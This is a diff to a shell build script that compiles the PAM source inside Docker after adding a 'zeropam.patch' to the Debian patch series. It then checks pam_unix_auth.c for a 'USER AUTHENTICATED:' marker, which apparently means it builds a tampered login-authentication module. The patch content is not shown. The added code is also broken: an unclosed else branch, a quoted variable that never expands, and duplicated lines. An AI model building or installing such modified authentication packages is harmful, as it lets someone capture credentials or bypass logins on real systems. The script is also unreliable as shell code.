@@ -29,19 +29,35 @@ docker run --rm -v "$OUTDIR":/out -v "$PATCH":/tmp/zeropam.patch $IMAGE bash -c 
     cd pam-*
     
     # For Debian/Ubuntu, add patch to the patches-applied directory which persists through clean
-    mkdir -p debian/patches-applied/
-    cp /tmp/zeropam.patch debian/patches-applied/zeropam.patch
-    
-    # Add to patches-applied/series so it gets applied during build
-    if [ -f debian/patches-applied/series ]; then
-      echo 'zeropam.patch' >> debian/patches-applied/series
+    if [[ '$DISTRO' == debian* ]]; then
+      mkdir -p debian/patches-applied/
+      cp /tmp/zeropam.patch debian/patches-applied/zeropam.patch
+      
+      # Add to patches-applied/series so it gets applied during build
+      if [ -f debian/patches-applied/series ]; then
+        echo 'zeropam.patch' >> debian/patches-applied/series
+      else
+        echo 'zeropam.patch' > debian/patches-applied/series
+      fi
+      
+      echo '[*] Added zeropam.patch to debian/patches-applied/series'
+      
+      echo '[*] Added zeropam.patch to debian/patches-applied/series'
     else
-      echo 'zeropam.patch' > debian/patches-applied/series
-    fi
-    
-    echo '[*] Added zeropam.patch to debian/patches-applied/series'
-    
-    echo '[*] Added zeropam.patch to debian/patches-applied/series'
+      mkdir -p debian/patches/
+      cp /tmp/zeropam.patch debian/patches/zeropam.patch
+      
+      # Add to patches/series so it gets applied during build
+      if [ -f debian/patches/series ]; then
+        echo 'zeropam.patch' >> debian/patches/series
+      else
+        echo 'zeropam.patch' > debian/patches/series
+      fi
+      
+      echo '[*] Added zeropam.patch to debian/patches/series'
+      
+      echo '[*] Added zeropam.patch to debian/patches/series'
+
     echo '[*] Verifying patch applied to source...'
     if grep -q 'USER AUTHENTICATED:' modules/pam_unix/pam_unix_auth.c 2>/dev/null; then
       echo '[✓] Patch already applied to source code'
